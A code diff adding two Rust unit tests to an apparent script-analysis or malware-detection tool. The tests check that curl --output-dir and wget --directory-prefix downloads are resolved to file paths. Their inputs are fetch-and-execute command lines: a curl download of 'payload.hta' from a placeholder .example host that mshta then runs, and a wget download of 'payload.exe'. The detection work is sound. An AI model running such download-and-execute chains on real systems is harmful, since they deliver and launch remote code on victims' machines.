@@ -6768,6 +6768,40 @@ mshta C:\Temp\stage.hta"#,
     }
 
     #[test]
+    fn curl_slash_output_dir_applies_to_relative_output_for_later_execution() {
+        let report = analyze(
+            br#"curl --output-dir C:/Temp -o stage.hta https://curl-slash-output-dir-o.example/payload.hta
+mshta C:/Temp/stage.hta"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://curl-slash-output-dir-o.example/payload.hta"
+                            && dst == "C:/Temp/stage.hta"
+                )
+            }),
+            "curl slash --output-dir did not join relative -o destination: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:/Temp/stage.hta"
+                            && url == "https://curl-slash-output-dir-o.example/payload.hta"
+                )
+            }),
+            "mshta slash path did not resolve curl output-dir download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_output_dir_relative_output_in_deob_text_uses_joined_destination() {
         let mut env = Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -19727,6 +19761,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert!(
             has,
             "wget --directory-prefix destination was not resolved to the file path: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_slash_directory_prefix_resolves_to_downloaded_filename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --directory-prefix=C:/Temp https://wget-slash-dir-prefix.example/payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-slash-dir-prefix.example/payload.exe"
+                        && dst.as_deref() == Some("C:/Temp/payload.exe")
+            )
+        });
+        assert!(
+            has,
+            "wget slash --directory-prefix destination was not resolved to the file path: {:?}",
             env.traits
         );
     }
